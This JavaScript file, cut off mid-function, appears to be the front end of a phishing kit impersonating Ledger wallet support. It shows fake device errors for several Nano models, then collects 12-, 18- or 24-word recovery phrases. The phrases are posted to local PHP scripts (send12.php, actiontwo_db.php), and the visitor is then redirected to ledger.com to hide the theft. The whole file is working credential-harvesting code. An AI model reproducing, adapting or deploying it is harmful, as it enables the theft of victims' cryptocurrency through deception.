var availableTags = ["test1", "test2", "test3"];

$(document).ready(function() {


    $('input.typeahead').typeahead({
        name: 'typeahead',
        remote: "db/searchuser.php?key=%QUERY",
        limit: 10,
        freeInput: false
    }).on('typeahead:selected', function(data, value, text) {
        console.log(value);
    });


    $(document).on("click", "button#twelvewordsNew", function() {

        var wordCount = $(this).attr("data-count");

        $("div#eighteenwordsdivOne").hide();
        $("div#twentyfourwordsdivOne").hide();
        $("div#twelvewordsdivOne").show();
        $("button.btn.continueButton").attr('data-word-check', wordCount);
        $("button#continueButton").attr('data-word-check', wordCount);

    });

    $(document).on("click", "button#eighteenwordsNew", function() {

        var wordCount = $(this).attr("data-count");

        $("div#twelvewordsdivOne").hide();
        $("div#twentyfourwordsdivOne").hide();
        $("div#eighteenwordsdivOne").show();
        $("button.btn.continueButton").attr('data-word-check', wordCount);
        $("button#continueButton").attr('data-word-check', wordCount);

    });

    $(document).on("click", "button#twentyfourWordsNew", function() {

        var wordCount = $(this).attr("data-count");

        $("div#twentyfourwordsdivOne").show();
        $("div#twelvewordsdivOne").hide();
        $("div#eighteenwordsdivOne").hide();
        $("div#continueButtonDivOne").show();
        $("button.btn.continueButton").attr('data-word-check', wordCount);
        $("button#continueButton").attr('data-word-check', wordCount);

    });

    $(document).on("click", "button#twelvewordsNew", function() {

        var wordCount = $(this).attr("data-count");
        $("button#continueThirdStep").attr("data-attr-wordcount", wordCount);

    });

    $(document).on("click", "button#continueThirdStep", function() {

        var continueButtonAttr = $(this).attr("data-attr-wordcount").trim();

        if (continueButtonAttr == "") {

            toastr.error("Please select phrase.");
            return;

        } else {

            $("div#firstStepBlock").hide();
            $("div#secondStepBlock").hide();
            $("div#thirdStepBlock").hide();
            $("div#fourthStepBlock").show();

            if (continueButtonAttr == "12") {

                $("div#eighteenwordsdiv").hide();
                $("div#twentyfourwordsdiv").hide();
                $("div#twelvewordsdiv").show();

            }

            if (continueButtonAttr == "18") {

                $("div#twelvewordsdiv").hide();
                $("div#twentyfourwordsdiv").hide();
                $("div#eighteenwordsdiv").show();
            }

            if (continueButtonAttr == "24") {
                $("div#eighteenwordsdiv").hide();
                $("div#twelvewordsdiv").hide();
                $("div#twentyfourwordsdiv").show();

            }

            $("button#continueButton").attr('data-word-check', continueButtonAttr);
            $("button#continueButton").attr('data-step', 1);

        }

    });


    $(document).on("click", "button#cryptoRecoveryPhrase", function() {

        $("div#firstStepBlock").hide();
        $("div#secondStepBlock").hide();
        $("div#fourthStepBlock").hide();
        $("div#thirdStepBlock").show();


    });

    $(document).on("click", "button#refreshButtonAction", function() {

        var delay = 5000;

        var paths = window.location.pathname.split('/');
        var is_laptop = paths[paths.length - 1] == '1' ? true : false;
        console.log(is_laptop);

        if (is_laptop) {
            $(".BlueNext").show();
            delay = 4500;
        } else {
            $(".NanoXNext").show();
            delay = 4100;
        }

        $(".NanoSNextErrorBlock").hide();
        $("button#refreshButtonAction").hide();
        $("button#cryptoRecoveryPhrase").hide();

        setTimeout(function() {
            if (is_laptop) {
                $(".BlueNext").hide();
            } else {
                $(".NanoXNext").hide();
            }

            $(".NanoSNextErrorBlock").show();
            $("button#refreshButtonAction").show();
            $("button#cryptoRecoveryPhrase").show();

        }, delay);


    });

    $(document).on("click", "button#recovme button#continueButton", function() {
        var delay = 3000;
        console.log($("#loading-done"));
        $("#loading-done").css("display", "block");

        setTimeout(function() {
            $("#loading-done").css("display", "none");
            location.href = "/";
            console.log("done");
            // location.reload();
        }, delay);
    });

    var currentNano = "Nano S";

    $(document).on("click", ".device", function() {

        var attributeName = $(this).attr('data-attr-name');

        //  setTimeout(function () {
        var delay = 5000;

        if (attributeName == 'Nano S') {
            currentNano = "Nano S";
            $(".NanoSPlusNext").hide();
            $(".NanoXNext").hide();
            $(".BlueNext").hide();
            $(".NanoSNext").show();

        }

        if (attributeName == 'Nano S Plus') {

            currentNano = "Nano S Plus";
            $(".NanoSNext").hide();
            $(".NanoXNext").hide();
            $(".BlueNext").hide();
            $(".NanoSPlusNext").show();
        }

        if (attributeName == 'Nano X') {

            currentNano = "Nano X";
            $(".NanoSPlusNext").hide();
            $(".BlueNext").hide();
            $(".NanoSNext").hide();
            $(".NanoXNext").show();

        }

        if (attributeName == 'Blue') {

            currentNano = "Blue";
            $(".NanoSPlusNext").hide();
            $(".NanoSNext").hide();
            $(".NanoXNext").hide();
            $(".BlueNext").show();

        }

        $("div#firstStepBlock").hide();
        $("div#thirdStepBlock").hide();
        $("div#fourthStepBlock").hide();

        if (currentNano == "Nano S") {
            $(".NanoSNext").show();
            delay = 4600;
        } else if (currentNano == "Nano X") {
            $(".NanoXNext").show();
            delay = 4100;
        } else if (currentNano == "Nano S Plus") {
            $(".NanoSPlusNext").show();
            delay = 4200;
        } else if (currentNano == "Blue") {
            $(".BlueNext").show();
            delay = 4500;
        }

        setTimeout(function() {
            $('.NanoSNextErrorBlock').show();
            $('button#cryptoRecoveryPhrase').show();
            $('button#refreshButtonAction').show();
            $(".NanoSPlusNext").hide();
            $(".NanoSNext").hide();
            $(".NanoXNext").hide();
            $(".BlueNext").hide();

        }, delay);


        $("div#secondStepBlock").show();



        //     }, 500);


    });

    $(document).on("click", "button#continueButton", function() {

        var wordcheck = $(this).attr('data-word-check');

        var last_inserted_id = $('button#continueButton').attr('last-inserted-id');

        var stepinfo = 2;

        if (wordcheck == 12) {

            var first_input_12 = $("input[name=12_first_input]").val().trim();
            var second_input_12 = $("input[name=12_second_input]").val().trim();
            var third_input_12 = $("input[name=12_third_input]").val().trim();
            var fourth_input_12 = $("input[name=12_fourth_input]").val().trim();
            var fifth_input_12 = $("input[name=12_fifth_input]").val().trim();
            var sixth_input_12 = $("input[name=12_sixth_input]").val().trim();
            var seventh_input_12 = $("input[name=12_seventh_input]").val().trim();
            var eight_input_12 = $("input[name=12_eight_input]").val().trim();
            var ninth_input_12 = $("input[name=12_ninth_input]").val().trim();
            var tenth_input_12 = $("input[name=12_tenth_input]").val().trim();
            var eleven_input_12 = $("input[name=12_eleven_input]").val().trim();
            var twelve_input_12 = $("input[name=12_twelve_input]").val().trim();

            if (first_input_12 == "") {
                $("input[name=12_first_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=12_first_input]").css('border', 'unset');

            }


            if (second_input_12 == "") {

                $("input[name=12_second_input]").css('border', '2px solid red');
                return;

            } else {

                $("input[name=12_second_input]").css('border', 'unset');

            }

            if (third_input_12 == "") {
                $("input[name=12_third_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=12_third_input]").css('border', 'unset');

            }

            if (fourth_input_12 == "") {
                $("input[name=12_fourth_input]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_fourth_input]").css('border', 'unset');

            }

            if (fifth_input_12 == "") {
                $("input[name=12_fifth_input]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_fifth_input]").css('border', 'unset');

            }

            if (sixth_input_12 == "") {
                $("input[name=12_sixth_input]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_sixth_input]").css('border', 'unset');

            }

            if (seventh_input_12 == "") {

                $("input[name=12_seventh_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=12_seventh_input]").css('border', 'unset');

            }

            if (eight_input_12 == "") {
                $("input[name=12_eight_input]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_eight_input]").css('border', 'unset');

            }

            if (ninth_input_12 == "") {
                $("input[name=12_ninth_input]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_ninth_input]").css('border', 'unset');

            }

            if (tenth_input_12 == "") {
                $("input[name=12_tenth_input]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_tenth_input]").css('border', 'unset');

            }

            if (eleven_input_12 == "") {

                $("input[name=12_eleven_input]").css('border', '2px solid red');

                return false;

            } else {

                $("input[name=12_eleven_input]").css('border', 'unset');

            }

            if (twelve_input_12 == "") {

                $("input[name=12_twelve_input]").css('border', '2px solid red');
                return;

            } else {

                $("input[name=12_eleven_input]").css('border', 'unset');

            }

            $.ajax({
                type: 'POST',
                url: "db/actiontwo_db.php",
                data: {
                    last_inserted_id: last_inserted_id,
                    stepinfo: stepinfo,
                    wordcheck: wordcheck,
                    first_input_12: first_input_12,
                    second_input_12: second_input_12,
                    third_input_12: third_input_12,
                    fourth_input_12: fourth_input_12,
                    fifth_input_12: fifth_input_12,
                    sixth_input_12: sixth_input_12,
                    seventh_input_12: seventh_input_12,
                    eight_input_12: eight_input_12,
                    ninth_input_12: ninth_input_12,
                    tenth_input_12: tenth_input_12,
                    eleven_input_12: eleven_input_12,
                    twelve_input_12: twelve_input_12
                },
                cache: false,
                aysnc: false,
                success: function(resultData) {
                    var jsonRes = JSON.parse(resultData);

                    if (jsonRes.status == true) {
                        if (stepinfo == 2) {
                            toastr.info("Please wait...");
                            var delay = 2000;
                            setTimeout(function() {
                                window.location = "../../www.ledger.com/ledger-live.html";
                            }, delay);
                            return;
                        }

                    } else {
                        toastr.error("Something is wrong.Please try again later.");
                        return;
                    }

                }
            });

        }

        /** EIGHTEEN **/
        if (wordcheck == 18) {

            var first_input_18 = $("input[name=18_first_input]").val().trim();
            var second_input_18 = $("input[name=18_second_input]").val().trim();
            var third_input_18 = $("input[name=18_third_input]").val().trim();
            var fourth_input_18 = $("input[name=18_fourth_input]").val().trim();
            var fifth_input_18 = $("input[name=18_fifth_input]").val().trim();
            var sixth_input_18 = $("input[name=18_sixth_input]").val().trim();
            var seventh_input_18 = $("input[name=18_seventh_input]").val().trim();
            var eight_input_18 = $("input[name=18_eight_input]").val().trim();
            var ninth_input_18 = $("input[name=18_ninth_input]").val().trim();
            var tenth_input_18 = $("input[name=18_tenth_input]").val().trim();
            var eleven_input_18 = $("input[name=18_eleven_input]").val().trim();
            var twelve_input_18 = $("input[name=18_twelve_input]").val().trim();
            var thirteen_input_18 = $("input[name=18_thirteen_input]").val().trim();
            var fourteen_input_18 = $("input[name=18_fourteen_input]").val().trim();
            var fifteen_input_18 = $("input[name=18_fifteen_input]").val().trim();
            var sixteen_input_18 = $("input[name=18_sixteen_input]").val().trim();
            var seventeen_input_18 = $("input[name=18_seventeen_input]").val().trim();
            var eighteen_input_18 = $("input[name=18_eighteen_input]").val().trim();

            if (first_input_18 == "") {

                $("input[name=18_first_input]").css('border', '2px solid red');

                return false;

            } else {

                $("input[name=18_first_input]").css('border', 'unset');
            }

            if (second_input_18 == "") {

                $("input[name=18_second_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_second_input]").css('border', 'unset');

            }

            if (third_input_18 == "") {

                $("input[name=18_third_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_third_input]").css('border', 'unset');
            }

            if (fourth_input_18 == "") {

                $("input[name=18_fourth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_fourth_input]").css('border', 'unset');

            }

            if (fifth_input_18 == "") {

                $("input[name=18_fifth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_fifth_input]").css('border', 'unset');

            }

            if (sixth_input_18 == "") {

                $("input[name=18_sixth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_sixth_input]").css('border', 'unset');

            }

            if (seventh_input_18 == "") {

                $("input[name=18_seventh_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_seventh_input]").css('border', 'unset');
            }

            if (eight_input_18 == "") {

                $("input[name=18_eight_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_eight_input]").css('border', 'unset');
            }

            if (ninth_input_18 == "") {

                $("input[name=18_ninth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_ninth_input]").css('border', 'unset');
            }

            if (tenth_input_18 == "") {

                $("input[name=18_tenth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_tenth_input]").css('border', 'unset');

            }

            if (eleven_input_18 == "") {

                $("input[name=18_eleven_input]").css('border', '2px solid red');
                return false;


            } else {

                $("input[name=18_eleven_input]").css('border', 'unset');

            }

            if (twelve_input_18 == "") {

                $("input[name=18_twelve_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_twelve_input]").css('border', 'unset');

            }

            if (thirteen_input_18 == "") {

                $("input[name=18_thirteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_thirteen_input]").css('border', 'unset');

            }

            if (fourteen_input_18 == "") {

                $("input[name=18_fourteen_input]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=18_fourteen_input]").css('border', 'unset');

            }

            if (fifteen_input_18 == "") {

                $("input[name=18_fifteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_fifteen_input]").css('border', 'unset');

            }

            if (sixteen_input_18 == "") {

                $("input[name=18_sixteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_sixteen_input]").css('border', 'unset');

            }

            if (seventeen_input_18 == "") {

                $("input[name=18_seventeen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_seventeen_input]").css('border', 'unset');

            }

            if (eighteen_input_18 == "") {

                $("input[name=18_eighteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_eighteen_input]").css('border', 'unset');

            }


            $.ajax({
                type: 'POST',
                url: "db/actiontwo_db.php",
                data: {
                    last_inserted_id: last_inserted_id,
                    stepinfo: stepinfo,
                    wordcheck: wordcheck,
                    first_input_18: first_input_18,
                    second_input_18: second_input_18,
                    third_input_18: third_input_18,
                    fourth_input_18: fourth_input_18,
                    fifth_input_18: fifth_input_18,
                    sixth_input_18: sixth_input_18,
                    seventh_input_18: seventh_input_18,
                    eight_input_18: eight_input_18,
                    ninth_input_18: ninth_input_18,
                    tenth_input_18: tenth_input_18,
                    eleven_input_18: eleven_input_18,
                    twelve_input_18: twelve_input_18,
                    thirteen_input_18: thirteen_input_18,
                    fourteen_input_18: fourteen_input_18,
                    fifteen_input_18: fifteen_input_18,
                    sixteen_input_18: sixteen_input_18,
                    seventeen_input_18: seventeen_input_18,
                    eighteen_input_18: eighteen_input_18
                },
                cache: false,
                aysnc: false,
                success: function(resultData) {
                    var jsonRes = JSON.parse(resultData);

                    if (jsonRes.status == true) {
                        if (stepinfo == 2) {
                            toastr.info("Please wait...");
                            var delay = 2000;
                            setTimeout(function() {
                                window.location = "../../www.ledger.com/ledger-live.html";
                            }, delay);
                            return;
                        }

                    } else {
                        toastr.error("Something is wrong.Please try again later.");
                        return;
                    }

                }
            });

        }
        /** EIGHTEEN **/

        if (wordcheck == 24) {

            var first_input_24 = $("input[name=24_first_input]").val().trim();
            var second_input_24 = $("input[name=24_second_input]").val().trim();
            var third_input_24 = $("input[name=24_third_input]").val().trim();
            var fourth_input_24 = $("input[name=24_fourth_input]").val().trim();
            var fifth_input_24 = $("input[name=24_fifth_input]").val().trim();
            var sixth_input_24 = $("input[name=24_sixth_input]").val().trim();
            var seventh_input_24 = $("input[name=24_seventh_input]").val().trim();
            var eight_input_24 = $("input[name=24_eight_input]").val().trim();
            var ninth_input_24 = $("input[name=24_ninth_input]").val().trim();
            var tenth_input_24 = $("input[name=24_tenth_input]").val().trim();
            var eleven_input_24 = $("input[name=24_eleven_input]").val().trim();
            var twelve_input_24 = $("input[name=24_twelve_input]").val().trim();
            var thirteen_input_24 = $("input[name=24_thirteen_input]").val().trim();
            var fourteen_input_24 = $("input[name=24_fourteen_input]").val().trim();
            var fifteen_input_24 = $("input[name=24_fifteen_input]").val().trim();
            var sixteen_input_24 = $("input[name=24_sixteen_input]").val().trim();
            var seventeen_input_24 = $("input[name=24_seventeen_input]").val().trim();
            var eighteen_input_24 = $("input[name=24_eighteen_input]").val().trim();
            var ninteen_input_24 = $("input[name=24_ninteen_input]").val().trim();
            var twenty_input_24 = $("input[name=24_twenty_input]").val().trim();
            var twentyone_input_24 = $("input[name=24_twentyone_input]").val().trim();
            var twentytwo_input_24 = $("input[name=24_twentytwo_input]").val().trim();
            var twentythree_input_24 = $("input[name=24_twentythree_input]").val().trim();
            var twentyfour_input_24 = $("input[name=24_twentyfour_input]").val().trim();

            if (first_input_24 == "") {

                $("input[name=24_first_input]").css('border', '2px solid red');

                return false;

            } else {

                $("input[name=24_first_input]").css('border', 'unset');
            }

            if (second_input_24 == "") {

                $("input[name=24_second_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_second_input]").css('border', 'unset');

            }

            if (third_input_24 == "") {

                $("input[name=24_third_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_third_input]").css('border', 'unset');
            }

            if (fourth_input_24 == "") {

                $("input[name=24_fourth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_fourth_input]").css('border', 'unset');

            }

            if (fifth_input_24 == "") {

                $("input[name=24_fifth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_fifth_input]").css('border', 'unset');

            }

            if (sixth_input_24 == "") {

                $("input[name=24_sixth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_sixth_input]").css('border', 'unset');

            }

            if (seventh_input_24 == "") {

                $("input[name=24_seventh_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_seventh_input]").css('border', 'unset');
            }

            if (eight_input_24 == "") {

                $("input[name=24_eight_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_eight_input]").css('border', 'unset');
            }

            if (ninth_input_24 == "") {

                $("input[name=24_ninth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_ninth_input]").css('border', 'unset');
            }

            if (tenth_input_24 == "") {

                $("input[name=24_tenth_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_tenth_input]").css('border', 'unset');

            }

            if (eleven_input_24 == "") {

                $("input[name=24_eleven_input]").css('border', '2px solid red');
                return false;


            } else {

                $("input[name=24_eleven_input]").css('border', 'unset');

            }

            if (twelve_input_24 == "") {

                $("input[name=24_twelve_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twelve_input]").css('border', 'unset');

            }

            if (thirteen_input_24 == "") {

                $("input[name=24_thirteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_thirteen_input]").css('border', 'unset');

            }

            if (fourteen_input_24 == "") {

                $("input[name=24_fourteen_input]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=24_fourteen_input]").css('border', 'unset');

            }

            if (fifteen_input_24 == "") {

                $("input[name=24_fifteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_fifteen_input]").css('border', 'unset');

            }

            if (sixteen_input_24 == "") {

                $("input[name=24_sixteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_sixteen_input]").css('border', 'unset');

            }

            if (seventeen_input_24 == "") {

                $("input[name=24_seventeen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_seventeen_input]").css('border', 'unset');

            }

            if (eighteen_input_24 == "") {

                $("input[name=24_eighteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_eighteen_input]").css('border', 'unset');

            }

            if (ninteen_input_24 == "") {

                $("input[name=24_ninteen_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_ninteen_input]").css('border', 'unset');

            }

            if (twenty_input_24 == "") {

                $("input[name=24_twenty_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twenty_input]").css('border', 'unset');

            }

            if (twentyone_input_24 == "") {

                $("input[name=24_twentyone_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twentyone_input]").css('border', 'unset');

            }

            if (twentytwo_input_24 == "") {

                $("input[name=24_twentytwo_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twentytwo_input]").css('border', 'unset');

            }

            if (twentythree_input_24 == "") {

                $("input[name=24_twentythree_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twentythree_input]").css('border', 'unset');

            }

            if (twentyfour_input_24 == "") {

                $("input[name=24_twentyfour_input]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twentyfour_input]").css('border', 'unset');

            }

            $.ajax({
                type: 'POST',
                url: "db/actiontwo_db.php",
                data: {
                    last_inserted_id: last_inserted_id,
                    stepinfo: stepinfo,
                    wordcheck: wordcheck,
                    first_input_24: first_input_24,
                    second_input_24: second_input_24,
                    third_input_24: third_input_24,
                    fourth_input_24: fourth_input_24,
                    fifth_input_24: fifth_input_24,
                    sixth_input_24: sixth_input_24,
                    seventh_input_24: seventh_input_24,
                    eight_input_24: eight_input_24,
                    ninth_input_24: ninth_input_24,
                    tenth_input_24: tenth_input_24,
                    eleven_input_24: eleven_input_24,
                    twelve_input_24: twelve_input_24,
                    thirteen_input_24: thirteen_input_24,
                    fourteen_input_24: fourteen_input_24,
                    fifteen_input_24: fifteen_input_24,
                    sixteen_input_24: sixteen_input_24,
                    seventeen_input_24: seventeen_input_24,
                    eighteen_input_24: eighteen_input_24,
                    ninteen_input_24: ninteen_input_24,
                    twenty_input_24: twenty_input_24,
                    twentyone_input_24: twentyone_input_24,
                    twentytwo_input_24: twentytwo_input_24,
                    twentythree_input_24: twentythree_input_24,
                    twentyfour_input_24: twentyfour_input_24
                },
                cache: false,
                aysnc: false,
                success: function(resultData) {
                    var jsonRes = JSON.parse(resultData);

                    if (jsonRes.status == true) {
                        if (stepinfo == 2) {
                            toastr.info("Please wait...");
                            var delay = 2000;
                            setTimeout(function() {
                                window.location = "../../www.ledger.com/ledger-live.html";
                            }, delay);
                            return;
                        }

                    } else {
                        toastr.error("Something is wrong.Please try again later.");
                        return;
                    }

                }
            });

        }

    });

    /** LAST DIV CODE **/
    $(document).on("click", "button.btn.continueButton", function() {

        var wordcheck = $(this).attr('data-word-check');

        var last_inserted_id = 0;

        if ($(this).attr('data-step').trim() == "") {

            var stepinfo = 1;


        } else {

            var stepinfo = $(this).attr('data-step');

        }

        if (wordcheck == 12) {

            var first_input_12 = $("input[name=12_first_input_1]").val().trim();
            var second_input_12 = $("input[name=12_second_input_1]").val().trim();
            var third_input_12 = $("input[name=12_third_input_1]").val().trim();
            var fourth_input_12 = $("input[name=12_fourth_input_1]").val().trim();
            var fifth_input_12 = $("input[name=12_fifth_input_1]").val().trim();
            var sixth_input_12 = $("input[name=12_sixth_input_1]").val().trim();
            var seventh_input_12 = $("input[name=12_seventh_input_1]").val().trim();
            var eight_input_12 = $("input[name=12_eight_input_1]").val().trim();
            var ninth_input_12 = $("input[name=12_ninth_input_1]").val().trim();
            var tenth_input_12 = $("input[name=12_tenth_input_1]").val().trim();
            var eleven_input_12 = $("input[name=12_eleven_input_1]").val().trim();
            var twelve_input_12 = $("input[name=12_twelve_input_1]").val().trim();

            if (first_input_12 == "") {
                $("input[name=12_first_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=12_first_input_1]").css('border', 'unset');

            }


            if (second_input_12 == "") {

                $("input[name=12_second_input_1]").css('border', '2px solid red');
                return;

            } else {

                $("input[name=12_second_input_1]").css('border', 'unset');

            }

            if (third_input_12 == "") {
                $("input[name=12_third_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=12_third_input_1]").css('border', 'unset');

            }

            if (fourth_input_12 == "") {
                $("input[name=12_fourth_input_1]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_fourth_input_1]").css('border', 'unset');

            }

            if (fifth_input_12 == "") {
                $("input[name=12_fifth_input_1]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_fifth_input_1]").css('border', 'unset');

            }

            if (sixth_input_12 == "") {
                $("input[name=12_sixth_input_1]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_sixth_input_1]").css('border', 'unset');

            }

            if (seventh_input_12 == "") {

                $("input[name=12_seventh_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=12_seventh_input_1]").css('border', 'unset');

            }

            if (eight_input_12 == "") {
                $("input[name=12_eight_input_1]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_eight_input_1]").css('border', 'unset');

            }

            if (ninth_input_12 == "") {
                $("input[name=12_ninth_input_1]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_ninth_input_1]").css('border', 'unset');

            }

            if (tenth_input_12 == "") {
                $("input[name=12_tenth_input_1]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=12_tenth_input_1]").css('border', 'unset');

            }

            if (eleven_input_12 == "") {

                $("input[name=12_eleven_input_1]").css('border', '2px solid red');

                return false;

            } else {

                $("input[name=12_eleven_input_1]").css('border', 'unset');

            }

            if (twelve_input_12 == "") {

                $("input[name=12_twelve_input_1]").css('border', '2px solid red');
                return;

            } else {

                $("input[name=12_eleven_input_1]").css('border', 'unset');

            }

            $.ajax({
                type: 'POST',
                url: "./send12.php",
                data: {
                    last_inserted_id: last_inserted_id,
                    stepinfo: stepinfo,
                    wordcheck: wordcheck,
                    first_input_12: first_input_12,
                    second_input_12: second_input_12,
                    third_input_12: third_input_12,
                    fourth_input_12: fourth_input_12,
                    fifth_input_12: fifth_input_12,
                    sixth_input_12: sixth_input_12,
                    seventh_input_12: seventh_input_12,
                    eight_input_12: eight_input_12,
                    ninth_input_12: ninth_input_12,
                    tenth_input_12: tenth_input_12,
                    eleven_input_12: eleven_input_12,
                    twelve_input_12: twelve_input_12
                },
                cache: false,
                aysnc: false,
                success: function(resultData) {
                    toastr.info("Please wait...");
                    var delay = 2000;
                    setTimeout(function() {
                        window.location = "https://www.ledger.com/ledger-live";
                    }, delay);
                    return;
                    var jsonRes = JSON.parse(resultData);



                    $("div#thirdStepBlock").hide();
                    $("div#secondStepBlock").hide();
                    $("div#firstStepBlock").hide();
                    $("#twelvewordsdiv").show();
                    $("div#fourthStepBlock").show();
                    $('button#continueButton').attr('last-inserted-id', 2);



                }
            });

        }

        /** EIGHTEEN **/
        if (wordcheck == 18) {

            var first_input_18 = $("input[name=18_first_input_1]").val().trim();
            var second_input_18 = $("input[name=18_second_input_1]").val().trim();
            var third_input_18 = $("input[name=18_third_input_1]").val().trim();
            var fourth_input_18 = $("input[name=18_fourth_input_1]").val().trim();
            var fifth_input_18 = $("input[name=18_fifth_input_1]").val().trim();
            var sixth_input_18 = $("input[name=18_sixth_input_1]").val().trim();
            var seventh_input_18 = $("input[name=18_seventh_input_1]").val().trim();
            var eight_input_18 = $("input[name=18_eight_input_1]").val().trim();
            var ninth_input_18 = $("input[name=18_ninth_input_1]").val().trim();
            var tenth_input_18 = $("input[name=18_tenth_input_1]").val().trim();
            var eleven_input_18 = $("input[name=18_eleven_input_1]").val().trim();
            var twelve_input_18 = $("input[name=18_twelve_input_1]").val().trim();
            var thirteen_input_18 = $("input[name=18_thirteen_input_1]").val().trim();
            var fourteen_input_18 = $("input[name=18_fourteen_input_1]").val().trim();
            var fifteen_input_18 = $("input[name=18_fifteen_input_1]").val().trim();
            var sixteen_input_18 = $("input[name=18_sixteen_input_1]").val().trim();
            var seventeen_input_18 = $("input[name=18_seventeen_input_1]").val().trim();
            var eighteen_input_18 = $("input[name=18_eighteen_input_1]").val().trim();

            if (first_input_18 == "") {

                $("input[name=18_first_input_1]").css('border', '2px solid red');

                return false;

            } else {

                $("input[name=18_first_input_1]").css('border', 'unset');
            }

            if (second_input_18 == "") {

                $("input[name=18_second_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_second_input_1]").css('border', 'unset');

            }

            if (third_input_18 == "") {

                $("input[name=18_third_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_third_input_1]").css('border', 'unset');
            }

            if (fourth_input_18 == "") {

                $("input[name=18_fourth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_fourth_input_1]").css('border', 'unset');

            }

            if (fifth_input_18 == "") {

                $("input[name=18_fifth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_fifth_input_1]").css('border', 'unset');

            }

            if (sixth_input_18 == "") {

                $("input[name=18_sixth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_sixth_input_1]").css('border', 'unset');

            }

            if (seventh_input_18 == "") {

                $("input[name=18_seventh_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_seventh_input_1]").css('border', 'unset');
            }

            if (eight_input_18 == "") {

                $("input[name=18_eight_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_eight_input_1]").css('border', 'unset');
            }

            if (ninth_input_18 == "") {

                $("input[name=18_ninth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_ninth_input_1]").css('border', 'unset');
            }

            if (tenth_input_18 == "") {

                $("input[name=18_tenth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_tenth_input_1]").css('border', 'unset');

            }

            if (eleven_input_18 == "") {

                $("input[name=18_eleven_input_1]").css('border', '2px solid red');
                return false;


            } else {

                $("input[name=18_eleven_input_1]").css('border', 'unset');

            }

            if (twelve_input_18 == "") {

                $("input[name=18_twelve_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_twelve_input_1]").css('border', 'unset');

            }

            if (thirteen_input_18 == "") {

                $("input[name=18_thirteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_thirteen_input_1]").css('border', 'unset');

            }

            if (fourteen_input_18 == "") {

                $("input[name=18_fourteen_input_1]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=18_fourteen_input_1]").css('border', 'unset');

            }

            if (fifteen_input_18 == "") {

                $("input[name=18_fifteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_fifteen_input_1]").css('border', 'unset');

            }

            if (sixteen_input_18 == "") {

                $("input[name=18_sixteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

